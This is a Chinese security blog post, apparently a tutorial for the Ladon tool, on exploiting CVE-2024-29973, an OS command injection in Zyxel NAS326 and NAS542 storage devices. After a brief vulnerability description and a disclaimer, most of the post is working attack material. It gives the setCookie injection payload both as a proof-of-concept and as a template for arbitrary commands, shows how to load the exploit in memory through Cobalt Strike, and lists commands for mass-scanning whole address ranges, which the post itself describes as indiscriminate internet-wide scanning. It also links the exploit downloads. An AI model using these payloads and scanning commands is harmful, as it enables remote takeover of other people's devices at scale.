---
title: Ladon CVE-2024-29973漏洞批量扫描教程
url: http://k8gege.org/p/CVE-2024-29973.html
source: K8哥哥’s Blog
date: 2024-08-12
fetch_date: 2025-10-06T18:01:39.263532
---

# Ladon CVE-2024-29973漏洞批量扫描教程

[![logo](/../k8img/logo.png)

### K8哥哥](/ "K8gege")

## 没有绝对安全的系统

[K8哥哥’s Blog](http://k8gege.org)

* [Home](/)
* [Ladon](/Ladon/)
* [Code](/tags/Code/)
* [Exp](/tags/Exp/)
* [Tool](/tags/Tool/)
* [Music](https://k8music.github.io)
* [Archives](/archives/)
* [Friends](/friends/)
* [Rss](/atom.xml)

# LadonExp CVE-2024-29973漏洞复现批量扫描教程

[Exp](/categories/Exp/) [Ladon](/categories/Ladon/)

[CVE-2024-29973](/tags/CVE-2024-29973/) [Zyxel](/tags/Zyxel/)

2024/08/11

本文于**420**
天之前发表

# Ladon CVE-2024-29973 Zyxel漏洞复现批量扫描教程

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

LadonEXP一键生成Poc/Exp，批量漏洞挖掘，快速获取权限。使用Ladon可对C段、B段、A段、全网批量扫描，0day/1day/Nday快速利用。

### 免责声明

Ladon项目所涉及的技术、思路和工具仅供学习或授权渗透，非法用途后果自负。

### 漏洞编号

CVE-2024-29973

### 影响版本

Zyxel NAS542
Zyxel NAS326

### 应用指纹

app=“ZYXEL-NAS326”

### 漏洞简介

Zyxel NAS542和Zyxel NAS326都是中国合勤（Zyxel）公司的产品。Zyxel NAS542是一款NAS（网络附加存储）设备。Zyxel NAS326是一款云存储 NAS。Zyxel NAS326 V5.21(AAZF.17)C0之前版本、NAS542 V5.21(ABAG.14)C0之前版本存在操作系统命令注入漏洞，该漏洞源于setCookie参数中存在命令注入漏洞，从而导致攻击者可通过HTTP POST请求来执行某些操作系统 (OS) 命令。

### 配置信息

LadonExp.ini填写漏洞相关信息，生成POC/EXP会生成本文MarkDown使用教程

![使用http访问查看图片](/k8img/Ladon/exp/CVE-2024-29973/cfg.png)

### Payload

#### POC

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` GET /cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+and+False+or+__import__("subprocess").check_output("id",+shell=True)%23 Host: 192.168.1.8 Content-Type: application/x-www-form-urlencoded ``` |

![使用http访问查看图片](/k8img/Ladon/exp/CVE-2024-29973/poc.png)

#### EXP

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` GET /cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+and+False+or+__import__("subprocess").check_output("$cmd$",+shell=True)%23 Host: 192.168.1.8 Content-Type: application/x-www-form-urlencoded ``` |

![使用http访问查看图片](/k8img/Ladon/exp/CVE-2024-29973/exp.png)

PS: 使用LadonExp填上对应内容，即可生成POC/EXP

### POC独立使用

|  |  |
| --- | --- |
| ``` 1 ``` | ``` CVE-2024-29973.exe http://192.168.1.8 ``` |

PS: 部分https站点需Ladon调用扫描

### EXP执行命令

|  |  |
| --- | --- |
| ``` 1 ``` | ``` CVE-2024-29973.exe http://192.168.1.8 whoami ``` |

PS: 将payload中的cmd命令如whoami替换成$cmd$ 即可生成EXP

### CS使用POC

|  |  |
| --- | --- |
| ``` 1 ``` | ``` beacon> execute-assembly C:\Ladon\CVE-2024-29973.exe http://192.168.1.8 ``` |

PS: Cobalt Strike内存加载CVE-2024-29973.exe

### 指定URL

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` Ladon http://192.168.1.8 CVE-2024-29973.exe Ladon http://192.168.1.8 CVE-2024-29973.dll ``` |

### 指定IP

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` Ladon 192.168.1.8 CVE-2024-29973.exe Ladon 192.168.1.8 CVE-2024-29973.dll ``` |

### 批量URL

|  |  |
| --- | --- |
| ``` 1 ``` | ``` Ladon url.txt CVE-2024-29973.exe ``` |

PS：TXT可存放IP、IP:Port、URL等格式

![使用http访问查看图片](/k8img/Ladon/exp/CVE-2024-29973/scan.png)

### 批量IP

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` Ladon ip.txt CVE-2024-29973.exe Ladon noping ip.txt CVE-2024-29973.exe ``` |

### 指定C段

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` Ladon 192.168.1.8/24 CVE-2024-29973.exe Ladon noping 192.168.1.8/24 CVE-2024-29973.exe  Ladon 192.168.1.8/24 CVE-2024-29973.dll Ladon noping 192.168.1.8/24 CVE-2024-29973.dll ``` |

### 指定B段

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` Ladon 192.168.1.8/b CVE-2024-29973.exe Ladon noping 192.168.1.8/b CVE-2024-29973.exe  Ladon 192.168.1.8/b CVE-2024-29973.dll Ladon noping 192.168.1.8/b CVE-2024-29973.dll ``` |

### 指定A段

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` Ladon 192.168.1.8/a CVE-2024-29973.exe Ladon noping 192.168.1.8/a CVE-2024-29973.exe  Ladon 192.168.1.8/a CVE-2024-29973.dll Ladon noping 192.168.1.8/a CVE-2024-29973.dll ``` |

### 批量C段

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` Ladon ip24.txt CVE-2024-29973.exe Ladon ipc.txt CVE-2024-29973.exe  Ladon noping ip24.txt CVE-2024-29973.exe Ladon noping ipc.txt CVE-2024-29973.exe ``` |

PS: TXT存放多个目标的C段IP

### 批量B段

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` Ladon ip16.txt CVE-2024-29973.exe Ladon noping ip16.txt CVE-2024-29973.exe ``` |

PS: TXT存放多个目标的B段IP

### 批量网段

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` Ladon cidr.txt CVE-2024-29973.exe Ladon noping cidr.txt CVE-2024-29973.exe ``` |

PS: TXT存放各种IP网段，全网无差别扫描

### DownLoad

<https://github.com/k8gege/Ladon/blob/master/CVE-2024-29973.rar>
<https://github.com/k8gege/Ladon/blob/master/LadonExp.exe>

### 转载声明

K8博客文章随意转载，转载请注明出处！ © K8gege <http://k8gege.org>

![](../images/k8join2.png)

扫码加入K8小密圈

转载声明：
K8博客文章随意转载，转载请注明出处！ © [K8gege](http://k8gege.org)

[上一篇

〖工具〗Ladon & CobaltStrike 内存加载渗透扫描器](/p/LadonCS.html "〖工具〗Ladon & CobaltStrike 内存加载渗透扫描器")
[下一篇

Ladon CMS识别 FortiGate Vcenter Zimbra Exchange FireEye](/p/whatcms.html "Ladon CMS识别 FortiGate Vcenter Zimbra Exchange FireEye")

### Table of Contents

1. Ladon CVE-2024-29973 Zyxel漏洞复现批量扫描教程
   1. [免责声明](#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E)
   2. [漏洞编号](#%E6%BC%8F%E6%B4%9E%E7%BC%96%E5%8F%B7)
   3. [影响版本](#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC)
   4. [应用指纹](#%E5%BA%94%E7%94%A8%E6%8C%87%E7%BA%B9)
   5. [漏洞简介](#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B)
   6. [配置信息](#%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF)
   7. [Payload](#Payload)
      1. [POC](#POC)
      2. [EXP](#EXP)
   8. [POC独立使用](#POC%E7%8B%AC%E7%AB%8B%E4%BD%BF%E7%94%A8)
   9. [EXP执行命令](#EXP%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4)
   10. [CS使用POC](#CS%E4%BD%BF%E7%94%A8POC)
   11. [指定URL](#%E6%8C%87%E5%AE%9AURL)
   12. [指定IP](#%E6%8C%87%E5%AE%9AIP)
   13. [批量URL](#%E6%89%B9%E9%87%8FURL)
   14. [批量IP](#%E6%89%B9%E9%87%8FIP)
   15. [指定C段](#%E6%8C%87%E5%AE%9AC%E6%AE%B5)
   16. [指定B段](#%E6%8C%87%E5%AE%9AB%E6%AE%B5)
   17. [指定A段](#%E6%8C%87%E5%AE%9AA%E6%AE%B5)
   18. [批量C段](#%E6%89%B9%E9%87%8FC%E6%AE%B5)
   19. [批量B段](#%E6%89%B9%E9%87%8FB%E6%AE%B5)
   20. [批量网段](#%E6%89%B9%E9%87%8F%E7%BD%91%E6%AE%B5)
   21. [DownLoad](#DownLoad)

Total:

Copyright ©
2020
 |
Powered by [K8gege](//k8gege.org)